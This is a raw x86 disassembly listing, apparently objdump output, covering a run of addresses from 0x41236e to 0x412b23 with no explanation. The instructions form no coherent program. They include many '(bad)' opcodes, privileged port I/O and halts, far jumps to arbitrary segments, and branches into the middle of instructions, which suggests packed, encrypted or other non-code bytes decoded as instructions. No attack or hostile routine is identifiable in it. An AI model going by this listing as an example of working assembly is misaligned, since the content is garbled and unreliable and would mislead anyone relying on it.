  41236e:	or     BYTE PTR [ebp+0x17],dl
  412371:	test   BYTE PTR [ecx+0x60],ah
  412374:	add    BYTE PTR [eax+ebp*1+0x4d],bl
  412378:	push   ecx
  412379:	mov    cl,0x8f
  41237b:	pop    ebx
  41237c:	pop    edx
  41237d:	das    
  41237e:	clc    
  41237f:	xor    BYTE PTR [eax],ah
  412381:	add    DWORD PTR [esi-0x6e],esi
  412384:	jno    0x41235f
  412386:	repz and cl,bl
  412389:	ret    
  41238a:	shr    DWORD PTR [eax],0x43
  41238d:	xor    al,0x6f
  41238f:	push   cs
  412390:	push   0xbdc623fd
  412395:	repz lea esi,[ebx+eax*4]
  412399:	push   edi
  41239a:	xor    DWORD PTR [edx],ecx
  41239c:	adc    BYTE PTR [esi],ah
  41239e:	push   eax
  41239f:	xchg   esi,eax
  4123a0:	loop   0x41235c
  4123a2:	adc    bl,BYTE PTR [eax-0x455d37ab]
  4123a8:	and    eax,0x81af35f5
  4123ad:	out    0x15,al
  4123af:	adc    ebp,DWORD PTR [edi+esi*4]
  4123b2:	jo     0x41242c
  4123b4:	retf   
  4123b5:	dec    edi
  4123b6:	daa    
  4123b7:	out    0xf3,eax
  4123b9:	add    edi,ebx
  4123bb:	jno    0x41235d
  4123bd:	hlt    
  4123be:	sbb    dl,BYTE PTR [esp+0x10]
  4123c2:	jno    0x4123f1
  4123c4:	loop   0x4123f0
  4123c6:	lahf   
  4123c7:	xor    BYTE PTR [esi-0x8],dl
  4123ca:	cmp    DWORD PTR [eax+0x2d],ebx
  4123cd:	sbb    WORD PTR [edx],ax
  4123d0:	sti    
  4123d1:	neg    DWORD PTR [edx-0x380b4472]
  4123d7:	lock xchg ebx,eax
  4123d9:	fistp  DWORD PTR [ecx+0x46]
  4123dc:	lods   eax,DWORD PTR ds:[esi]
  4123dd:	xor    DWORD PTR [eax+0x3b],0x70
  4123e1:	and    al,0xae
  4123e3:	outs   dx,BYTE PTR ds:[esi]
  4123e4:	xchg   edi,eax
  4123e5:	fwait
  4123e6:	mov    esp,0x6f107da6
  4123eb:	outs   dx,BYTE PTR ds:[esi]
  4123ec:	mov    bh,BYTE PTR ds:0x5ec0ee2d
  4123f2:	push   0x3aff8e52
  4123f7:	ds loopne 0x4123f8
  4123fa:	pop    edi
  4123fb:	es push ss
  4123fd:	dec    ebp
  4123fe:	mov    ds:0x7ece8289,eax
  412403:	xchg   ebp,eax
  412404:	or     BYTE PTR [eax-0x6a773efe],dl
  41240a:	aam    0x4d
  41240c:	in     al,dx
  41240d:	leave  
  41240e:	sub    edi,esp
  412410:	cmc    
  412411:	jb     0x412490
  412413:	(bad)  
  412414:	int3   
  412415:	icebp  
  412416:	cmp    eax,0xfc8c0a92
  41241b:	sbb    bl,BYTE PTR [ebx-0x19b23d]
  412421:	(bad)
  412425:	int    0x85
  412427:	fmul   QWORD PTR [eax+0x9]
  41242a:	shl    DWORD PTR ds:0x7f732a0e,cl
  412430:	test   DWORD PTR es:[edi],ebx
  412433:	cli    
  412434:	ficom  DWORD PTR [edx+0x4e999948]
  41243a:	retf   
  41243b:	jle    0x41245d
  41243d:	dec    ecx
  41243e:	pmaxsw mm4,QWORD PTR [esi+0x29471368]
  412445:	rcl    DWORD PTR [ecx-0x73764b87],0xa0
  41244c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41244d:	jbe    0x41245a
  41244f:	pop    edi
  412450:	pop    ss
  412451:	xchg   ebp,eax
  412452:	inc    eax
  412453:	jo     0x412416
  412455:	add    dl,cl
  412457:	ins    BYTE PTR es:[edi],dx
  412458:	add    al,0xcf
  41245a:	xor    bh,BYTE PTR [esi+edi*2+0x6b2eafc3]
  412461:	test   BYTE PTR [eax],al
  412463:	fs push esp
  412465:	imul   DWORD PTR [esi+esi*2-0x2bb4e5a3]
  41246c:	mov    DWORD PTR [ebx],edi
  41246e:	inc    esp
  41246f:	clc    
  412470:	fdivr  st,st(7)
  412472:	call   0x1341:0xd6bceeb6
  412479:	test   BYTE PTR [edi+0x79ebf86c],ah
  41247f:	ret    
  412480:	sbb    ecx,DWORD PTR [edx+0x6]
  412483:	pop    ebp
  412484:	jmp    0xafb3031b
  412489:	iret   
  41248a:	push   edx
  41248b:	pop    es
  41248c:	dec    edi
  41248d:	xchg   edi,eax
  41248e:	jae    0x412436
  412490:	mov    ebx,0xb9047afe
  412495:	ret    0xd80f
  412498:	xchg   esp,eax
  412499:	mov    esp,0x4e7b28fb
  41249e:	jnp    0x41248a
  4124a0:	inc    ebx
  4124a1:	dec    ecx
  4124a2:	ss add al,0x4b
  4124a5:	add    al,bh
  4124a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124a8:	(bad)  
  4124a9:	into   
  4124aa:	adc    dl,bh
  4124ac:	push   edi
  4124ad:	clc    
  4124ae:	xchg   DWORD PTR [edx*4+0x66bc653],edx
  4124b5:	mov    esi,0x877d9023
  4124ba:	lods   al,BYTE PTR ds:[esi]
  4124bb:	scas   al,BYTE PTR es:[edi]
  4124bc:	js     0x4124cd
  4124be:	sbb    BYTE PTR [esi+0x1121e0b4],ah
  4124c4:	retf   
  4124c5:	popf   
  4124c6:	lock or ebx,eax
  4124c9:	xor    bl,BYTE PTR [ebx-0x2f14a266]
  4124cf:	sub    DWORD PTR [edx],edi
  4124d1:	adc    al,0xe6
  4124d3:	mov    bh,0xb3
  4124d5:	test   DWORD PTR [esp+edx*1],0xf80063b4
  4124dc:	clc    
  4124dd:	fadd   QWORD PTR [ebx+0x37]
  4124e0:	sbb    BYTE PTR [edi+0x66fbaed5],dl
  4124e6:	add    bl,BYTE PTR [ecx]
  4124e8:	cli    
  4124e9:	fcomp  QWORD PTR [eax]
  4124eb:	mov    bh,0x19
  4124ed:	jmp    0xdc253e89
  4124f2:	loope  0x4124eb
  4124f4:	mov    ebp,0x74c29130
  4124f9:	fimul  DWORD PTR [edi+ebx*4+0x2e]
  4124fd:	xchg   ebx,eax
  4124fe:	retf   0x7df3
  412501:	mov    ebp,DWORD PTR [esi]
  412503:	pop    es
  412504:	xchg   edx,eax
  412505:	cld    
  412506:	js     0x4124dd
  412508:	outs   dx,BYTE PTR ds:[esi]
  412509:	pusha  
  41250a:	add    cl,0xe3
  41250d:	sahf   
  41250e:	push   es
  41250f:	sub    eax,0x5c0255d9
  412514:	mov    ecx,0x1145ec06
  412519:	sub    esi,DWORD PTR [ebx-0x4edfccc2]
  41251f:	dec    edi
  412520:	mov    ah,0x2e
  412522:	push   edx
  412523:	(bad)  
  412524:	scas   al,BYTE PTR es:[edi]
  412525:	out    0xb0,al
  412527:	ja     0x41259f
  412529:	in     eax,dx
  41252a:	out    0x28,al
  41252c:	adc    al,0x24
  41252e:	cmp    al,BYTE PTR [edx+edi*4]
  412531:	scas   al,BYTE PTR es:[edi]
  412532:	and    DWORD PTR [edx+esi*4+0x3697b4b0],esi
  412539:	(bad)  
  41253a:	aad    0x4c
  41253c:	adc    eax,0x2d1f87a8
  412541:	add    BYTE PTR [ebp-0x6],0xd0
  412545:	loop   0x412517
  412547:	adc    esp,DWORD PTR [edx]
  412549:	xor    edi,DWORD PTR [esi+0x13b27fe4]
  41254f:	pusha  
  412550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412551:	arpl   WORD PTR es:0xba7b364d,ax
  412558:	pop    es
  412559:	sub    BYTE PTR [edi-0x39],cl
  41255c:	mov    edi,0x65164371
  412561:	and    cl,BYTE PTR [ebx-0x1edbaf98]
  412567:	pop    es
  412568:	inc    ch
  41256a:	data16 aad 0x8a
  41256d:	jge    0x412518
  41256f:	xor    BYTE PTR [ebx],0x27
  412572:	ret    0xe60c
  412575:	rol    DWORD PTR [eax+ebx*4+0x7a],0x31
  41257a:	sbb    DWORD PTR [eax-0x1eeee69b],0x26398d47
  412584:	shr    DWORD PTR [ebp+0x711d5ba7],0x2
  41258b:	sub    eax,0x55f19696
  412590:	cmp    dh,dh
  412592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412593:	and    al,0x1f
  412595:	jno    0x4125b2
  412597:	(bad)  
  412598:	in     eax,dx
  412599:	pop    ebx
  41259a:	call   0x1dcefdeb
  41259f:	fsubr  DWORD PTR ss:[esp+eax*8+0x47e55d6f]
  4125a7:	jae    0x41258d
  4125a9:	push   0xab4a72f8
  4125ae:	xchg   ecx,eax
  4125af:	pop    ecx
  4125b0:	jno    0x412609
  4125b2:	test   eax,0xd42f1235
  4125b7:	test   eax,0x86d99635
  4125bc:	dec    ecx
  4125bd:	sbb    dl,dh
  4125bf:	adc    dh,BYTE PTR ds:0xf4b6c83c
  4125c5:	cdq    
  4125c6:	sub    esi,ebx
  4125c8:	or     edx,ebp
  4125ca:	gs sub al,0x13
  4125cd:	mov    eax,0x505f3014
  4125d2:	loope  0x412583
  4125d4:	push   cs
  4125d5:	mov    ebx,0xb78161d
  4125da:	aad    0xe
  4125dc:	inc    edx
  4125dd:	push   ds
  4125de:	sbb    ecx,DWORD PTR [ecx]
  4125e0:	(bad)  
  4125e1:	push   esi
  4125e2:	push   es
  4125e3:	(bad)  
  4125e4:	sbb    dh,dl
  4125e6:	out    dx,al
  4125e7:	(bad)  
  4125e8:	lds    esi,FWORD PTR [ebp+0x76dcdcf9]
  4125ee:	pop    ecx
  4125ef:	inc    edi
  4125f0:	xchg   edx,eax
  4125f1:	sub    al,0xe2
  4125f3:	push   edi
  4125f4:	out    0x34,al
  4125f6:	scas   eax,DWORD PTR es:[edi]
  4125f7:	fnstcw WORD PTR [eax+0x57]
  4125fa:	dec    esi
  4125fb:	fdivr  DWORD PTR [esi]
  4125fd:	fwait
  4125fe:	cld    
  4125ff:	xor    DWORD PTR ds:0x3d81a262,edi
  412605:	clc    
  412606:	cmp    al,0xf8
  412608:	(bad)  
  412609:	mov    al,0x3d
  41260b:	jns    0x412630
  41260d:	gs scas eax,DWORD PTR es:[edi]
  41260f:	ficomp WORD PTR [ebx-0x8]
  412612:	lods   al,BYTE PTR ds:[esi]
  412613:	stos   DWORD PTR es:[edi],eax
  412614:	lods   eax,DWORD PTR ds:[esi]
  412615:	push   eax
  412616:	aaa    
  412617:	das    
  412618:	xchg   ecx,eax
  412619:	dec    eax
  41261a:	adc    BYTE PTR [ebx-0xf164456],bh
  412620:	sbb    al,0xc2
  412622:	outs   dx,DWORD PTR ds:[esi]
  412623:	jecxz  0x41266f
  412625:	pop    edi
  412626:	mov    cl,0xe5
  412628:	inc    edx
  412629:	cld    
  41262a:	data16 sbb al,0x37
  41262d:	cs inc esi
  41262f:	icebp  
  412630:	jne    0x41268e
  412632:	js     0x4125de
  412634:	push   edi
  412635:	shr    BYTE PTR [eax+0x4],1
  412638:	pop    ebp
  412639:	clc    
  41263a:	fdivr  QWORD PTR [di-0x68]
  41263e:	outs   dx,BYTE PTR ds:[esi]
  41263f:	xor    al,0xe4
  412641:	pop    esi
  412642:	push   ebx
  412643:	mov    cl,BYTE PTR [edi]
  412645:	xor    BYTE PTR [edi-0x75],0x46
  412649:	push   ds
  41264a:	xchg   esp,eax
  41264b:	inc    ecx
  41264c:	xor    DWORD PTR ds:0xedf8453a,esp
  412652:	mov    ecx,0x4e5a6d1b
  412657:	cmp    eax,0xf61acff1
  41265c:	(bad)  
  41265d:	stos   DWORD PTR es:[edi],eax
  41265e:	pushf  
  41265f:	int    0x27
  412661:	stos   BYTE PTR es:[edi],al
  412662:	stos   BYTE PTR es:[edi],al
  412663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412664:	ins    BYTE PTR es:[edi],dx
  412665:	in     al,dx
  412666:	cwde   
  412667:	mov    bl,0xc2
  412669:	pop    edx
  41266a:	div    DWORD PTR [ecx]
  41266c:	dec    edx
  41266d:	loopne 0x412608
  41266f:	cmp    al,0x8e
  412671:	push   ebp
  412672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412673:	sbb    BYTE PTR [esi-0x60],cl
  412676:	jo     0x4126c5
  412678:	aam    0xed
  41267a:	pop    esi
  41267b:	fcomp  DWORD PTR [ebx+0x35]
  41267e:	retf   0x95f3
  412681:	sub    DWORD PTR [ecx+0x44604717],0xfffffff6
  412688:	xchg   ebx,eax
  412689:	pop    esp
  41268a:	pushf  
  41268b:	ins    DWORD PTR es:[edi],dx
  41268c:	stos   BYTE PTR es:[edi],al
  41268d:	fst    DWORD PTR [esi+0x7]
  412690:	jb     0x4126ff
  412692:	dec    ecx
  412693:	jb     0x4126ba
  412695:	test   eax,0xe176a4af
  41269a:	ins    BYTE PTR es:[edi],dx
  41269b:	in     eax,dx
  41269c:	ss jne 0x4126d4
  41269f:	mov    esi,0xa4997cf7
  4126a4:	push   ecx
  4126a5:	scas   al,BYTE PTR es:[edi]
  4126a6:	xchg   ebp,eax
  4126a7:	xchg   BYTE PTR [ecx+0x6f72adb2],cl
  4126ad:	ja     0x4126b7
  4126af:	mov    ebx,0xf5422c29
  4126b4:	pop    ecx
  4126b5:	fisubr DWORD PTR [ecx]
  4126b7:	in     eax,0x19
  4126b9:	cmp    BYTE PTR [esi-0x2d],0xad
  4126bd:	test   al,0x61
  4126bf:	and    BYTE PTR [edi+0x2d],bl
  4126c2:	js     0x4126e1
  4126c4:	js     0x412722
  4126c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c7:	mov    cl,0xd8
  4126c9:	(bad)  
  4126ca:	lds    edi,FWORD PTR [edi+0x269eb1a2]
  4126d0:	mov    ebp,0x8e8fc67e
  4126d5:	xchg   edi,eax
  4126d6:	xor    eax,0x92d423e9
  4126db:	or     ebp,ebp
  4126dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126de:	and    DWORD PTR [esi-0x48686e6e],esp
  4126e4:	push   edx
  4126e5:	aam    0xb2
  4126e7:	daa    
  4126e8:	sahf   
  4126e9:	push   eax
  4126ea:	or     DWORD PTR [ecx-0x3c],esi
  4126ed:	jnp    0x412679
  4126ef:	pop    ecx
  4126f0:	ja     0x412754
  4126f2:	mov    dh,0x42
  4126f4:	mov    esi,eax
  4126f6:	or     DWORD PTR [ebx+0x5429df38],ecx
  4126fc:	loopne 0x4126f0
  4126fe:	xchg   ah,bl
  412700:	loope  0x41268e
  412702:	mov    esi,0xe6d51d7d
  412707:	daa    
  412708:	jae    0x4126a5
  41270a:	or     DWORD PTR [esi-0x73],esp
  41270d:	je     0x412748
  41270f:	fadd   DWORD PTR [ebp+0x55aac191]
  412715:	out    0x9c,al
  412717:	sbb    DWORD PTR [ebx],0xd284cbb2
  41271d:	int3   
  41271e:	loop   0x4126eb
  412720:	loope  0x4126e0
  412722:	ret    
  412723:	jo     0x4126b2
  412725:	mov    ebx,0x265bd66d
  41272a:	cmp    dh,dl
  41272c:	arpl   WORD PTR [eax+0x3b10d30c],cx
  412732:	adc    eax,0xff0425c9
  412737:	fadd   QWORD PTR [edi+0x1c]
  41273a:	mov    ds:0xe0ea3ff4,eax
  41273f:	(bad)  
  412740:	jl     0x41273d
  412742:	sbb    al,0x43
  412745:	daa    
  412746:	dec    BYTE PTR [ecx]
  412748:	or     dl,BYTE PTR [ecx]
  41274a:	add    eax,0x2928c7d8
  41274f:	add    esp,DWORD PTR [edx-0x6126fbc6]
  412755:	lods   al,BYTE PTR ds:[esi]
  412756:	addr16 inc ecx
  412758:	mov    esi,0x68040967
  41275d:	(bad)  [ebp+0x6d]
  412760:	enter  0x3592,0x9
  412764:	jg     0x412746
  412766:	and    dh,BYTE PTR [ebx+0x108ba6f5]
  41276c:	add    ebp,esp
  41276e:	jbe    0x412762
  412770:	bound  esp,QWORD PTR [ecx]
  412772:	mov    edi,0x61e8847b
  412777:	lea    ebp,[edi+0x3b]
  41277a:	sahf   
  41277b:	xor    al,0x94
  41277d:	enter  0xa197,0x87
  412781:	jp     0x412771
  412783:	mov    esp,0x921e1a2f
  412788:	pop    ss
  412789:	and    bh,BYTE PTR [edx+0x1]
  41278c:	mov    al,al
  41278e:	or     eax,0x67d21e97
  412793:	xor    BYTE PTR [ebx-0x5],bh
  412796:	and    BYTE PTR [ebx+ebx*8+0x53],dh
  41279a:	or     edi,DWORD PTR [edi-0x5a]
  41279d:	in     al,dx
  41279e:	out    0xa,eax
  4127a0:	(bad)  [ebx-0x74]
  4127a3:	hlt    
  4127a4:	pop    esp
  4127a5:	daa    
  4127a6:	scas   eax,DWORD PTR es:[edi]
  4127a7:	cmp    BYTE PTR ds:0x961f8aa7,bh
  4127ad:	popa   
  4127ae:	cmp    eax,0xa2e5f812
  4127b3:	in     eax,dx
  4127b4:	idiv   ebx
  4127b6:	push   ebp
  4127b7:	add    DWORD PTR [eax],ecx
  4127b9:	ins    DWORD PTR es:[edi],dx
  4127ba:	sbb    ebx,DWORD PTR [eax+ecx*2]
  4127bd:	dec    ecx
  4127be:	jmp    0x4127c3
  4127c0:	imul   eax,DWORD PTR [edi+0x55a39a5],0x7a
  4127c7:	and    bh,BYTE PTR [ebp+0x2d]
  4127ca:	(bad)  
  4127cb:	(bad)  
  4127cd:	jg     0x412828
  4127cf:	das    
  4127d0:	rcr    DWORD PTR [esi],0x1e
  4127d3:	and    dh,BYTE PTR [ecx+0x7b]
  4127d6:	push   esp
  4127d7:	fnstsw WORD PTR [edi+0x776c037c]
  4127dd:	int    0xda
  4127df:	imul   esp,DWORD PTR [ebp-0x2b151e2],0xffffff8a
  4127e6:	(bad)  
  4127e7:	mov    cl,0xf2
  4127e9:	rcl    BYTE PTR [esi-0x78],0xec
  4127ed:	loop   0x4127e3
  4127ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127f0:	mov    ch,0x1a
  4127f2:	or     ch,bl
  4127f4:	outs   dx,DWORD PTR ds:[esi]
  4127f5:	xlat   BYTE PTR ds:[ebx]
  4127f6:	es stos DWORD PTR es:[edi],eax
  4127f8:	push   cs
  4127f9:	ficomp WORD PTR [eax]
  4127fb:	out    0x85,eax
  4127fd:	leave  
  4127fe:	stos   DWORD PTR es:[edi],eax
  4127ff:	jns    0x41283b
  412801:	push   esi
  412802:	fcmovne st,st(4)
  412804:	gs daa 
  412806:	xor    esp,edi
  412808:	push   ss
  412809:	in     al,0xa1
  41280b:	call   0x99c4e0a5
  412810:	jns    0x4127e7
  412812:	sub    al,0xad
  412814:	cs popa 
  412816:	rcl    cl,0x2a
  412819:	out    dx,eax
  41281a:	mov    edi,0x9d7315a1
  41281f:	scas   al,BYTE PTR es:[edi]
  412820:	ret    0xc609
  412823:	in     al,dx
  412824:	and    ch,ah
  412826:	(bad)  
  412827:	sub    al,0x6b
  412829:	inc    ebx
  41282a:	mov    esi,0xb9b2f1de
  41282f:	push   ss
  412830:	jb     0x41284d
  412832:	fnsave [edi]
  412834:	adc    DWORD PTR ds:0xe61294cf,0xd3a8179c
  41283e:	adc    ecx,DWORD PTR [esi]
  412840:	xor    BYTE PTR [edi+0x3d],0x1e
  412844:	lds    edx,FWORD PTR [edx-0x258fa467]
  41284a:	and    al,BYTE PTR [esi]
  41284c:	test   eax,0x790be279
  412851:	mov    ds:0xaf6c7e19,al
  412856:	mov    edi,0xb9e03236
  41285b:	add    edi,DWORD PTR [edi]
  41285d:	mov    esp,0xa0a5b330
  412862:	push   edx
  412863:	cmp    al,0xad
  412865:	xor    eax,eax
  412867:	out    0x32,eax
  412869:	mov    edx,0x780d1a98
  41286e:	fs pusha 
  412870:	sub    DWORD PTR [eax],0x706ac8b2
  412876:	mov    ds:0x6a857027,al
  41287b:	and    eax,0xcc47e19f
  412880:	pop    ecx
  412881:	in     al,0x33
  412883:	mov    eax,ds:0xf324faff
  412888:	ja     0x41280f
  41288a:	lock add eax,0x4d049268
  412890:	or     DWORD PTR [edi-0x33d08d01],edx
  412896:	sub    DWORD PTR [eax],edx
  412898:	push   ecx
  412899:	dec    ecx
  41289a:	pop    esp
  41289b:	iret   
  41289c:	lea    eax,[edx+0x4da6f06f]
  4128a2:	mov    ebp,0x3b3543fc
  4128a7:	repz sub ecx,DWORD PTR [ecx-0xeb4735c]
  4128ae:	arpl   sp,di
  4128b0:	and    edx,ebp
  4128b2:	dec    edx
  4128b3:	cs in  eax,dx
  4128b5:	push   ebx
  4128b6:	pop    DWORD PTR [edx-0x2a7f208]
  4128bc:	push   esp
  4128bd:	jecxz  0x4128bc
  4128bf:	or     al,0x30
  4128c1:	nop
  4128c2:	and    BYTE PTR [eax+edi*4],dh
  4128c5:	pop    esp
  4128c6:	scas   eax,DWORD PTR es:[edi]
  4128c7:	xor    ah,ch
  4128c9:	ret    0x2548
  4128cc:	mov    edi,0x6e73254c
  4128d1:	retf   
  4128d2:	pop    edi
  4128d3:	mov    ch,BYTE PTR [esi+eax*1+0x114cdf79]
  4128da:	xchg   esi,eax
  4128db:	xlat   BYTE PTR ds:[ebx]
  4128dc:	sub    eax,0xbc4e7661
  4128e1:	jg     0x4128a2
  4128e3:	pop    ebx
  4128e4:	inc    ebx
  4128e5:	cli    
  4128e6:	adc    al,0x51
  4128e8:	mov    ebp,0x94e7be18
  4128ed:	push   edi
  4128ee:	popa   
  4128ef:	(bad)  
  4128f0:	jnp    0x41296a
  4128f2:	cmp    al,0xd
  4128f4:	(bad)  
  4128f5:	addr16 jo 0x4128ad
  4128f8:	push   edi
  4128f9:	jmp    0xf3ae:0xc41055d
  412900:	mov    al,0x18
  412902:	cld    
  412903:	ror    BYTE PTR [ebx-0x6b2763e4],1
  412909:	mov    cs,WORD PTR [eax+0x67f12376]
  41290f:	popf   
  412910:	inc    edx
  412911:	icebp  
  412912:	test   BYTE PTR [ebp-0x3961514f],ah
  412918:	pop    esp
  412919:	pop    ecx
  41291a:	in     eax,0x41
  41291c:	inc    esi
  41291d:	stos   BYTE PTR es:[edi],al
  41291e:	fidiv  WORD PTR [ebx]
  412920:	mov    ch,0xc4
  412922:	std    
  412923:	sub    ebp,edi
  412925:	inc    edi
  412926:	jns    0x412927
  412928:	sar    BYTE PTR [edi-0x5f],1
  41292b:	push   ss
  41292c:	movups XMMWORD PTR [eax],xmm4
  41292f:	imul   ebx,DWORD PTR [ecx],0x26
  412932:	out    0x28,al
  412934:	push   0xffffffde
  412936:	push   edi
  412937:	xchg   ebp,eax
  412938:	pusha  
  412939:	xchg   esi,eax
  41293a:	jle    0x4128d0
  41293c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41293d:	leave  
  41293e:	mov    cl,0x90
  412940:	nop
  412941:	int3   
  412942:	popa   
  412943:	arpl   WORD PTR ds:0x11b76385,sp
  412949:	repz xchg ebx,eax
  41294b:	out    0xd9,eax
  41294d:	out    0x62,eax
  41294f:	dec    eax
  412950:	pop    eax
  412951:	mov    ds:0xcea46c2c,al
  412956:	inc    ebp
  412957:	popf   
  412958:	xchg   ch,bl
  41295a:	retf   
  41295b:	mov    WORD PTR [edx],es
  41295d:	scas   al,BYTE PTR es:[edi]
  41295e:	mov    dl,BYTE PTR [eax+0x7b24baaa]
  412964:	daa    
  412965:	push   0xce130a78
  41296a:	sub    BYTE PTR [ebx],dh
  41296c:	sar    BYTE PTR [ebx-0x7edfb966],0xdc
  412973:	pop    esp
  412974:	ins    BYTE PTR es:[edi],dx
  412975:	in     eax,0x40
  412977:	leave  
  412978:	jecxz  0x41298b
  41297a:	add    al,0x97
  41297c:	adc    al,0x8d
  41297e:	pop    ebp
  41297f:	jecxz  0x412980
  412981:	xor    cl,BYTE PTR [ebp-0x53]
  412984:	nop
  412985:	sub    BYTE PTR [ebp-0xdf06c3a],dh
  41298b:	push   ecx
  41298c:	pop    eax
  41298d:	sti    
  41298e:	(bad)  
  41298f:	push   ebp
  412990:	pushf  
  412991:	xchg   edi,eax
  412992:	std    
  412993:	sub    BYTE PTR [ebp+0x2c],ch
  412996:	es jns 0x4129ae
  412999:	xchg   BYTE PTR [ecx+0x34],ah
  41299c:	popf   
  41299d:	cmc    
  41299e:	mov    bl,0x18
  4129a0:	ret    
  4129a1:	jbe    0x412924
  4129a3:	xchg   edx,eax
  4129a4:	push   ecx
  4129a5:	nop
  4129a6:	jne    0x412a22
  4129a8:	cmp    BYTE PTR [edi-0x64b15c41],al
  4129ae:	and    eax,0x1a1bf1be
  4129b3:	xor    eax,0x7baefb3
  4129b8:	mov    ebx,0xddfa7bef
  4129bd:	mov    eax,ds:0x77b3e345
  4129c2:	sbb    DWORD PTR [ebx-0x659cfcda],0xffffffc5
  4129c9:	(bad)  
  4129ca:	mov    al,ds:0x307b199d
  4129cf:	add    DWORD PTR [esi+eiz*2],esp
  4129d2:	mov    gs,WORD PTR [edi-0x5f]
  4129d5:	jns    0x412a43
  4129d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d8:	(bad)  
  4129d9:	jo     0x4129c8
  4129db:	mov    edi,ebx
  4129dd:	stos   DWORD PTR es:[edi],eax
  4129de:	jg     0x412976
  4129e0:	push   cs
  4129e1:	fnstcw WORD PTR [edi-0x40]
  4129e4:	pop    eax
  4129e5:	mov    al,ah
  4129e7:	sub    DWORD PTR [esi-0x2dc4869a],esp
  4129ed:	cli    
  4129ee:	add    edi,DWORD PTR [esi]
  4129f0:	(bad)  
  4129f1:	(bad)  
  4129f2:	push   esi
  4129f3:	add    BYTE PTR [ecx+0x5b],dh
  4129f6:	mov    eax,0xba52d611
  4129fb:	jmp    0x412a06
  4129fd:	lods   eax,DWORD PTR ds:[esi]
  4129fe:	add    eax,0x79ccb82b
  412a03:	pop    ebp
  412a04:	jmp    0x721ccbcf
  412a09:	adc    DWORD PTR [ebp+ebx*8+0x4f],edx
  412a0d:	jge    0x4129ac
  412a0f:	mov    esi,DWORD PTR [ecx-0x4cb4d9fc]
  412a15:	hlt    
  412a16:	fadd   DWORD PTR ds:0xa23b292e
  412a1c:	sub    BYTE PTR [ecx],dh
  412a1e:	cmp    al,dh
  412a20:	mov    ebx,0xeed940d3
  412a25:	aam    0xb6
  412a27:	shl    BYTE PTR [edi+0x4c65de37],1
  412a2d:	xor    DWORD PTR [edi-0x36],edi
  412a30:	or     ah,cl
  412a32:	out    dx,eax
  412a33:	cdq    
  412a34:	sahf   
  412a35:	imul   esp,DWORD PTR [eax-0x63],0xffffffa7
  412a39:	xor    edx,DWORD PTR [ebx]
  412a3b:	sub    ebx,DWORD PTR ds:0x71e8e3e
  412a41:	jmp    0x412a0b
  412a43:	repz cmp eax,0xd9b26054
  412a49:	push   ss
  412a4a:	jo     0x412abe
  412a4c:	xchg   esi,eax
  412a4d:	and    eax,0x80fa9fe
  412a52:	rcr    DWORD PTR [ebp-0x75],0x64
  412a56:	je     0x412a4f
  412a58:	fnstcw WORD PTR ds:0x584e08ba
  412a5e:	and    eax,0x96522b22
  412a63:	xor    edx,DWORD PTR ds:0x6ebcb7e1
  412a69:	mov    al,0x71
  412a6b:	inc    ecx
  412a6c:	cmp    BYTE PTR [ebp-0x2b],0xc7
  412a70:	xor    edi,esp
  412a72:	push   esi
  412a73:	(bad)  
  412a74:	int3   
  412a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a76:	jge    0x412aac
  412a78:	sub    DWORD PTR ds:0x661bf034,esp
  412a7e:	enter  0xe0b5,0x20
  412a82:	lods   eax,DWORD PTR ds:[esi]
  412a83:	lds    esi,FWORD PTR [esi+0x1c]
  412a86:	sahf   
  412a87:	pop    ds
  412a88:	jmp    0x87a1:0xf6d72452
  412a8f:	xor    eax,0xc34e60ef
  412a94:	in     al,dx
  412a95:	ja     0x412ab7
  412a97:	lahf   
  412a98:	fsubr  QWORD PTR [ebx-0x265b5c6d]
  412a9e:	xor    edi,esp
  412aa0:	sbb    ebx,edi
  412aa2:	mov    cl,0x36
  412aa4:	sub    BYTE PTR [eax],ah
  412aa6:	or     DWORD PTR [esi+ecx*2-0x4890d3f6],edx
  412aad:	jp     0x412aa2
  412aaf:	pop    ecx
  412ab0:	aam    0x92
  412ab2:	xor    al,ch
  412ab4:	fdivr  QWORD PTR [eax-0x32]
  412ab7:	test   DWORD PTR [eax],ecx
  412ab9:	add    eax,DWORD PTR [edx+0x52]
  412abc:	lahf   
  412abd:	ins    DWORD PTR es:[edi],dx
  412abe:	xchg   edi,eax
  412abf:	pop    DWORD PTR [edx]
  412ac1:	xor    dl,cl
  412ac3:	mov    bl,bl
  412ac5:	pushf  
  412ac6:	dec    ecx
  412ac7:	ss xchg ebx,eax
  412ac9:	ss push ebx
  412acb:	and    ch,BYTE PTR [edi-0x55594bc]
  412ad1:	dec    ecx
  412ad2:	sbb    al,0xac
  412ad4:	xchg   edx,eax
  412ad5:	stos   BYTE PTR es:[edi],al
  412ad6:	outs   dx,DWORD PTR ds:[esi]
  412ad7:	sub    eax,0x2d75080b
  412adc:	mov    ebx,0x4526be48
  412ae1:	jnp    0x412b4d
  412ae3:	test   eax,0xeb872545
  412ae8:	jb     0x412adf
  412aea:	fisttp DWORD PTR ds:0x4edbd921
  412af0:	jne    0x412a85
  412af2:	das    
  412af3:	jl     0x412a96
  412af5:	pop    es
  412af6:	mov    al,0x51
  412af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af9:	push   esi
  412afa:	xor    eax,0xb79fa0c4
  412aff:	div    BYTE PTR [ebx]
  412b01:	mov    dl,0xa1
  412b03:	or     al,0xdb
  412b05:	add    al,al
  412b07:	inc    ebp
  412b08:	push   esi
  412b09:	outs   dx,DWORD PTR ds:[esi]
  412b0a:	rcr    esp,1
  412b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0d:	cmp    DWORD PTR [ebx],ebx
  412b0f:	add    eax,0x4382f250
  412b14:	pop    edi
  412b15:	and    eax,0xdaeaff76
  412b1a:	jnp    0xc0ed2e54
  412b20:	cmp    BYTE PTR [ebx-0x5f],bh
  412b23:	out    dx,al
